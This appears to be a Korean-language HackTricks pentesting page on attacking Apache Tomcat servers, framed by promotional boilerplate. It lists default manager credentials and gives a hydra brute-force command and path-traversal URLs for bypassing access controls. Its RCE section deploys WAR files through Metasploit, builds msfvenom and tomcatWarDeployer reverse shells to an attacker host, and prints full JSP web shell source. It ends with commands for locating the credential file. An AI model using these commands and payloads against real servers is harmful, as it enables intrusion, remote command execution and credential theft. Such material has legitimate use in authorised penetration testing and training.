# Tomcat

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>을 통해 **제로부터 영웅이 되는 AWS 해킹을 배우세요**!</summary>

* **사이버 보안 회사**에서 일하시나요? **회사가 HackTricks에 광고되길 원하시나요**? 혹은 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요, 저희의 독점 [**NFT 컬렉션**](https://opensea.io/collection/the-peass-family)
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요
* [**💬**](https://emojipedia.org/speech-balloon/) **Discord 그룹**에 **가입**하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **해킹 트릭을 공유하고 싶으시다면** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **로 PR을 제출**하세요.

</details>

**Try Hard Security Group**

<figure><img src="https://github.com/carlospolop/hacktricks/blob/kr/network-services-pentesting/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## 발견

* 보통 **포트 8080**에서 실행됩니다.
* **일반적인 톰캣 오류:**

<figure><img src="../../../.gitbook/assets/image (1) (6).png" alt=""><figcaption></figcaption></figure>

## 열거

### **버전 식별**

Apache Tomcat의 버전을 찾으려면 간단한 명령을 실행할 수 있습니다:

```bash
curl -s http://tomcat-site.local:8080/docs/ | grep Tomcat
```

### **매니저 파일 위치**

**`/manager`** 및 **`/host-manager`** 디렉토리의 정확한 위치를 식별하는 것은 중요합니다. 이들 페이지의 이름이 변경될 수 있으므로 무차별 대입 검색이 권장됩니다.

### **사용자명 열거**

Tomcat 버전 6보다 오래된 경우, 다음을 통해 사용자명을 열거할 수 있습니다:

```bash
msf> use auxiliary/scanner/http/tomcat_enum
```

### **기본 자격 증명**

**`/manager/html`** 디렉토리는 WAR 파일의 업로드 및 배포를 허용하여 코드 실행으로 이어질 수 있기 때문에 특히 민감합니다. 이 디렉토리는 일반적으로 다음과 같은 기본 HTTP 인증으로 보호됩니다:

* admin:admin
* tomcat:tomcat
* admin:
* admin:s3cr3t
* tomcat:s3cr3t
* admin:tomcat

이러한 자격 증명은 다음을 사용하여 테스트할 수 있습니다:

```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```

다른 주목할만한 디렉토리는 \*\*`/manager/status`\*\*이며, 이는 Tomcat 및 OS 버전을 표시하여 취약점 식별을 돕습니다.

### **무차별 대입 공격**

manager 디렉토리에 대한 무차별 대입 공격을 시도하려면 다음을 사용할 수 있습니다:

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```

## 일반 취약점

### **비밀번호 백트레이스 노출**

`/auth.jsp`에 액세스하면 운좋게 비밀번호가 백트레이스에 노출될 수 있습니다.

### **이중 URL 인코딩**

`mod_jk`의 CVE-2007-1860 취약점은 이중 URL 인코딩 경로 이동을 허용하여 특별히 만들어진 URL을 통해 관리 인터페이스에 무단 액세스할 수 있게 합니다.

Tomcat의 관리 웹에 액세스하려면 다음 경로로 이동하십시오: `pathTomcat/%252E%252E/manager/html`

### /examples

Apache Tomcat 버전 4.x에서 7.x에는 정보 노출 및 크로스사이트 스크립팅(XSS) 공격에 취약한 예제 스크립트가 포함되어 있습니다. 이러한 스크립트는 무단 액세스 및 잠재적인 악용을 확인해야 합니다. [자세한 정보는 여기에서 확인하세요](https://www.rapid7.com/db/vulnerabilities/apache-tomcat-example-leaks/)

* /examples/jsp/num/numguess.jsp
* /examples/jsp/dates/date.jsp
* /examples/jsp/snp/snoop.jsp
* /examples/jsp/error/error.html
* /examples/jsp/sessions/carts.html
* /examples/jsp/checkbox/check.html
* /examples/jsp/colors/colors.html
* /examples/jsp/cal/login.html
* /examples/jsp/include/include.jsp
* /examples/jsp/forward/forward.jsp
* /examples/jsp/plugin/plugin.jsp
* /examples/jsp/jsptoserv/jsptoservlet.jsp
* /examples/jsp/simpletag/foo.jsp
* /examples/jsp/mail/sendmail.jsp
* /examples/servlet/HelloWorldExample
* /examples/servlet/RequestInfoExample
* /examples/servlet/RequestHeaderExample
* /examples/servlet/RequestParamExample
* /examples/servlet/CookieExample
* /examples/servlet/JndiServlet
* /examples/servlet/SessionExample
* /tomcat-docs/appdev/sample/web/hello.jsp

### **경로 이동 공격**

일부 [**Tomcat의 취약한 구성**](https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/)에서는 경로 `/..;/`를 사용하여 Tomcat의 보호된 디렉토리에 액세스할 수 있습니다.

예를 들어, 다음 경로로 **Tomcat 관리자** 페이지에 액세스할 수 있습니다: `www.vulnerable.com/lalala/..;/manager/html`

이 요령을 사용하여 보호된 경로를 우회하는 **또 다른 방법**은 `http://www.vulnerable.com/;param=value/manager/html`에 액세스하는 것입니다.

## RCE

마지막으로, Tomcat 웹 응용프로그램 관리자에 액세스할 수 있다면 **.war 파일을 업로드하고 배포하여 코드를 실행**할 수 있습니다.

### 제한 사항

**권한이 충분하다면**(역할: **admin**, **manager** 및 **manager-script**), WAR를 배포할 수 있습니다. 이러한 세부 정보는 일반적으로 `/usr/share/tomcat9/etc/tomcat-users.xml`에 정의된 \_tomcat-users.xml\_에서 찾을 수 있습니다(버전에 따라 다름) (자세한 내용은 [POST](./#post) 섹션 참조).

```bash
# tomcat6-admin (debian) or tomcat6-admin-webapps (rhel) has to be installed

# deploy under "path" context path
curl --upload-file monshell.war -u 'tomcat:password' "http://localhost:8080/manager/text/deploy?path=/monshell"

# undeploy
curl "http://tomcat:Password@localhost:8080/manager/text/undeploy?path=/monshell"
```

### Metasploit

### Metasploit

```bash
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```

### MSFVenom Reverse Shell

1. 배포할 war 파일 생성:

```bash
msfvenom -p java/shell_reverse_tcp LHOST=<LHOST_IP> LPORT=<LHOST_IP> -f war -o revshell.war
```

### `revshell.war` 파일을 업로드하고 접근 (`/revshell/`):

### [tomcatWarDeployer.py](https://github.com/mgeeky/tomcatWarDeployer)를 사용하여 바인드 및 역쉘을 설정합니다.

일부 시나리오에서는 작동하지 않을 수 있습니다 (예: sun의 이전 버전)

#### 다운로드

```bash
git clone https://github.com/mgeeky/tomcatWarDeployer.git
```

#### 리버스 쉘

```bash
./tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/
```

#### 바인드 쉘

```bash
./tomcatWarDeployer.py -U <username> -P <password> -p <bind_port> <victim_IP>:<victim_PORT>/manager/html/
```

### [Culsterd](https://github.com/hatRiot/clusterd) 사용하기

```bash
clusterd.py -i 192.168.1.105 -a tomcat -v 5.5 --gen-payload 192.168.1.6:4444 --deploy shell.war --invoke --rand-payload -o windows
```

### 수동 방법 - 웹 쉘

다음 [콘텐츠](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)로 **index.jsp**를 생성하세요:

```java
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
String s = null;
try {
Process p = Runtime.getRuntime().exec(cmd,null,null);
BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
while((s = sI.readLine()) != null) { output += s+"</br>"; }
}  catch(IOException e) {   e.printStackTrace();   }
}
%>
<pre><%=output %></pre>
```

```bash
mkdir webshell
cp index.jsp webshell
cd webshell
jar -cvf ../webshell.war *
webshell.war is created
# Upload it
```

### 수동 방법 2

[JSP 웹 쉘](https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)을 가져와 WAR 파일을 생성하십시오:

```bash
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup.war cmd.jsp
# When this file is uploaded to the manager GUI, the /backup application will be added to the table.
# Go to: http://tomcat-site.local:8180/backup/cmd.jsp
```

## POST

톰캣 자격 증명 파일의 이름은 \_tomcat-users.xml\_입니다.

```bash
find / -name tomcat-users.xml 2>/dev/null
```

다른 Tomcat 자격 증명을 수집하는 방법:

```bash
msf> use post/multi/gather/tomcat_gather
msf> use post/windows/gather/enum_tomcat
```

## 다른 톰캣 스캐닝 도구

* [https://github.com/p0dalirius/ApacheTomcatScanner](https://github.com/p0dalirius/ApacheTomcatScanner)

## 참고 자료

* [https://github.com/simran-sankhala/Pentest-Tomcat](https://github.com/simran-sankhala/Pentest-Tomcat)
* [https://hackertarget.com/sample/nexpose-metasploitable-test.pdf](https://hackertarget.com/sample/nexpose-metasploitable-test.pdf)

**Try Hard Security Group**

<figure><img src="https://github.com/carlospolop/hacktricks/blob/kr/network-services-pentesting/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로부터 AWS 해킹을 전문가로 배우세요</strong></summary>

* **사이버 보안 회사에서 일하시나요? 귀하의 회사가 HackTricks에 광고되길 원하시나요? 또는 PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드하고 싶으신가요?** [**구독 요금제**](https://github.com/sponsors/carlospolop)**를 확인하세요!**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* [**공식 PEASS & HackTricks 스왹**](https://peass.creator-spring.com)을 받으세요
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **해킹 트릭을 공유하려면 PR을** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **및** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **에 제출하세요.**

</details>
